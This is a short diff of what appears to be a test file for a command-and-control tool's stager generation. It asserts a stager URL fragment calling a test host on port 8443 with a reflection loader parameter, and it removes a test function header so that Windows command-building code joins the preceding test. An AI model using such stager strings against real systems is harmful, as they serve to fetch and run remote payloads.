@@ -115,8 +115,6 @@ def test_stager(full_app):
         + f"('https://{TEST_URI}:8443/0?t=https&f=h&a=reflection');"
     ) in (full_app['HTTPS'])
 
-
-def test_stager_execution(full_app):
     win10cmd = TEST_COMMANDS["win10"] % full_app
     # Insert formatter for extra command
     win10cmd = win10cmd[:-2] + '%s' + win10cmd[-2:]
